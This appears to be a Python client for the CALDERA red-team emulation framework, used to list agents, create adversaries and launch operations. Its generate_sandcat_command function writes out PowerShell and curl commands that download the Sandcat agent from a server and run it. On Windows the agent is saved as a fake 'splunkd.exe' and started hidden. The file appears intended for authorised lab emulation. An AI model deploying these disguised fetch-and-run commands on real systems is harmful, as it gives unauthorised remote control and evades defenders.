
import os
import logging
import re
from pathlib import Path
from urllib.parse import urlparse, urlunparse
from typing import Any

import requests
from dotenv import load_dotenv

load_dotenv(Path(__file__).resolve().parents[1] / ".env")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

class CalderaAPIError(Exception):
    """Raised when Caldera API returns an error or cannot be reached."""
    pass
class CalderaClient:
    def __init__(self, base_url=None, api_key=None, verify_ssl=False, timeout=10):
        self.base_url = (base_url or os.getenv("CALDERA_URL", "http://127.0.0.1:8888")).rstrip("/")
        self.api_key = api_key or os.getenv("CALDERA_API_KEY", "")
        self.verify_ssl = verify_ssl
        self.timeout = timeout

        self.session = requests.Session()
        if self.api_key:
            # CALDERA's REST API expects the KEY header. Keep Content-Type here
            # so every JSON request is accepted consistently by /api/v2 routes.
            self.session.headers.update({
                "KEY": self.api_key,
                "Content-Type": "application/json"
            })

    def _request(self, method, endpoint, **kwargs):
        url = f"{self.base_url}{endpoint}"

        try:
            response = self.session.request(
                method,
                url,
                timeout=self.timeout,
                verify=self.verify_ssl,
                **kwargs
            )
            response.raise_for_status()

            if response.text and response.text.strip():
                return response.json()

            return {}

        except requests.exceptions.RequestException as e:
            raise CalderaAPIError(f"Caldera API request failed for {method} {url}: {e}")

        except ValueError:
            raise CalderaAPIError("Caldera returned a non-JSON response.")

    def health_check(self):
        """
        Checks whether the Caldera server is reachable.

        Note:
        Some Caldera versions may not expose /api/v2/health.
        If this endpoint fails, use list_agents() as the practical connectivity test.
        """
        return self._request("GET", "/api/v2/health")

    def list_agents(self):
        return self._request("GET", "/api/v2/agents")

    def _normalise_bool(self, value):
        if isinstance(value, bool):
            return value
        if isinstance(value, str):
            return value.strip().lower() in {"true", "trusted", "yes", "1"}
        return bool(value)

    def _unwrap_collection(self, value, keys):
        """
        CALDERA versions/plugins return lists either directly or under keys
        such as agents, abilities, payloads, data, or objects. This keeps the
        rest of the app independent from that small API shape difference.
        """
        if isinstance(value, list):
            return value
        if not isinstance(value, dict):
            return []
        for key in keys:
            nested = value.get(key)
            if isinstance(nested, list):
                return nested
        for nested in value.values():
            if isinstance(nested, list):
                return nested
        return []

    def _agent_is_alive(self, agent):
        raw = agent.get("alive")
        if raw is not None:
            return self._normalise_bool(raw)
        status = str(agent.get("status") or agent.get("state") or "").lower()
        if status in {"dead", "offline", "untrusted"}:
            return False
        if status in {"alive", "online", "trusted", "running"}:
            return True
        return True

    def _normalise_agent(self, agent):
        trusted = self._normalise_bool(agent.get("trusted"))
        host = agent.get("host") or agent.get("host_name") or agent.get("hostname") or "unknown"
        last_seen = agent.get("last_seen") or agent.get("last_seen_time") or agent.get("last_seen_at")
        ip = (
            agent.get("host_ip_addrs")
            or agent.get("host_ip")
            or agent.get("host_ipv4")
            or agent.get("host_address")
            or agent.get("ip")
            or agent.get("address")
            or ""
        )
        if isinstance(ip, list):
            ip = ", ".join(str(item) for item in ip if item)
        else:
            ip = ", ".join(re.findall(r"(?:\d{1,3}\.){3}\d{1,3}", str(ip))) or str(ip or "")

        return {
            "paw": agent.get("paw"),
            "host": host,
            "hostname": host,
            "ip": ip,
            "platform": agent.get("platform") or agent.get("os") or agent.get("architecture") or "unknown",
            "group": agent.get("group"),
            "last_seen": last_seen,
            "trusted": trusted,
            "alive": self._agent_is_alive(agent),
            "status": "Online" if self._agent_is_alive(agent) else "Offline",
            "raw": agent,
        }

    def get_agents_normalized(self):
        agents = self.list_agents()
        agents = self._unwrap_collection(agents, ("agents", "data", "objects"))

        return [self._normalise_agent(agent) for agent in agents or []]

    def get_online_agents(self):
        return [
            agent
            for agent in self.get_agents_normalized()
            if agent.get("trusted") and agent.get("alive") and agent.get("paw")
        ]

    def delete_agent(self, paw):
        return self._request("DELETE", f"/api/v2/agents/{paw}")

    def list_operations(self):
        return self._request("GET", "/api/v2/operations")
    def get_abilities(self):
        return self._request("GET", "/api/v2/abilities")

    def get_payloads(self):
        return self._request("GET", "/api/v2/payloads")


    def create_adversary(self, name, ability_ids):
        payload = {
        "name": name,
        "description": "Auto-generated adversary profile",
        "atomic_ordering": ability_ids
        }
        return self._request("POST", "/api/v2/adversaries", json=payload)


    def delete_adversary(self, adversary_id):
        return self._request("DELETE", f"/api/v2/adversaries/{adversary_id}")


    def get_adversary_by_name(self, name):
        adversaries = self._request("GET", "/api/v2/adversaries")
        adversaries = self._unwrap_collection(adversaries, ("adversaries", "data", "objects"))

        for adv in adversaries:
            if adv.get("name", "").lower() == name.lower():
                return adv

        return None


    def get_operation_links(self, operation_id):
        return self._request("GET", f"/api/v2/operations/{operation_id}/links")


    def stop_operation(self, operation_id):
        payload = {"state": "finished"}
        return self._request("PATCH", f"/api/v2/operations/{operation_id}", json=payload)
    
    def get_operation(self, operation_id):
        return self._request("GET", f"/api/v2/operations/{operation_id}")

    def create_operation(self, name, adversary_id, group="red", planner_id=None):
        payload = {
            "name": name,
            "group": group,
            "adversary": {
                "adversary_id": adversary_id
            },
            "state": "running",
            "autonomous": 1
        }

        if planner_id:
            payload["planner"] = {
                "planner_id": planner_id
            }

        return self._request("POST", "/api/v2/operations", json=payload)
    
    def get_abilities_by_technique(self, technique_id):
        abilities = self.get_abilities()

        if isinstance(abilities, dict):
            abilities = abilities.get("abilities", [])

        matches = []

        for ability in abilities:
            attack = ability.get("technique_id") or ability.get("technique", {})

            if isinstance(attack, dict):
                tid = attack.get("attack_id")
            else:
                tid = attack

            if tid == technique_id:
                matches.append(ability)

        return matches

    # Compatibility aliases / helpers for older test scripts and callers
    def ping(self):
        """Backward-compatible ping method used by tests.
        Returns True if Caldera appears reachable, False otherwise.
        """
        try:
            # Prefer the health endpoint when available
            self.health_check()
            return True
        except CalderaAPIError:
            try:
                # Fallback to listing agents as a pragmatic connectivity check
                self.list_agents()
                return True
            except CalderaAPIError:
                return False

    def get_agents(self):
        """Alias for list_agents() returning a list of agents."""
        agents = self.list_agents()
        return self._unwrap_collection(agents, ("agents", "data", "objects"))

    def get_adversaries(self):
        """Return list of adversaries."""
        adv = self._request("GET", "/api/v2/adversaries")
        return self._unwrap_collection(adv, ("adversaries", "data", "objects"))

    def status(self):
        try:
            agents = self.list_agents()
            return {
                "ready": True,
                "status_code": 200,
                "detail": "reachable",
                "agents": agents,
            }
        except CalderaAPIError as exc:
            return {
                "ready": False,
                "status_code": getattr(exc, "status_code", 500),
                "detail": str(exc),
            }

    def _reachable_server_url(self, fallback_host=None):
        parsed = urlparse(self.base_url)
        if parsed.hostname in {"127.0.0.1", "localhost", "0.0.0.0"} and fallback_host:
            netloc = fallback_host
            if parsed.port and ":" not in fallback_host:
                netloc = f"{fallback_host}:{parsed.port}"
            return urlunparse((parsed.scheme or "http", netloc, parsed.path, "", "", ""))
        if parsed.hostname in {"127.0.0.1", "localhost", "0.0.0.0"}:
            return None
        return self.base_url

    def _sandcat_payload_name(self, platform='windows'):
        try:
            payloads = self.get_payloads()
        except CalderaAPIError:
            payloads = []

        payloads = self._unwrap_collection(payloads, ("payloads", "data", "objects"))

        names = []
        for payload in payloads or []:
            if isinstance(payload, str):
                names.append(payload)
            elif isinstance(payload, dict):
                names.append(payload.get("name") or payload.get("file") or payload.get("payload") or "")

        if "sandcat.go" in names:
            return "sandcat.go"
        return "sandcat.go"

    def generate_sandcat_command(self, kali_ip=None, group='red', platform='windows'):
        """
        Return one copyable Sandcat deploy block.

        The first variable is intentionally easy to edit because VM IPs change.
        The comments are included in the copied command so users understand what
        each part does before running it in an authorised lab target.
        """
        server = self._reachable_server_url(kali_ip)
        if not server:
            return (
                "# CALDERA server is configured as localhost. Edit CALDERA_SERVER "
                "to the Kali VM IP that the target can reach.\n"
                "$CALDERA_SERVER=\"http://CHANGE-ME:8888\""
            )
        payload_name = self._sandcat_payload_name(platform)

        if "win" in str(platform or "").lower():
            return (
                f"# Edit this IP if your Kali VM address changes; it must be reachable from the target.\n"
                f"$CALDERA_SERVER=\"{server}\";\n"
                "# Download the official Sandcat payload from CALDERA.\n"
                "$url=\"$CALDERA_SERVER/file/download\"; "
                "$wc=New-Object System.Net.WebClient; "
                "$wc.Headers.add(\"platform\",\"windows\"); "
                f"$wc.Headers.add(\"file\",\"{payload_name}\"); "
                "$data=$wc.DownloadData($url); "
                "\n# Replace any old lab Sandcat copy, then start a fresh agent in the chosen group.\n"
                "Get-Process | Where-Object {$_.Modules.FileName -like \"C:\\Users\\Public\\splunkd.exe\"} | Stop-Process -Force -ErrorAction SilentlyContinue; "
                "Remove-Item -Force \"C:\\Users\\Public\\splunkd.exe\" -ErrorAction SilentlyContinue; "
                "[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null; "
                f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $CALDERA_SERVER -group {group}\" -WindowStyle Hidden;"
            )

        return (
            "# Edit this IP if your Kali VM address changes; it must be reachable from the target.\n"
            f"CALDERA_SERVER='{server}';\n"
            "# Download the official Sandcat payload from CALDERA.\n"
            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$CALDERA_SERVER/file/download\" -o sandcat; "
            "\n# Start a fresh agent in the chosen group.\n"
            f"chmod +x sandcat; ./sandcat -server \"$CALDERA_SERVER\" -group {group}"
        )

    def get_adversary_list(self):
        """Alias for get_adversaries() - backwards compatibility."""
        return self.get_adversaries()
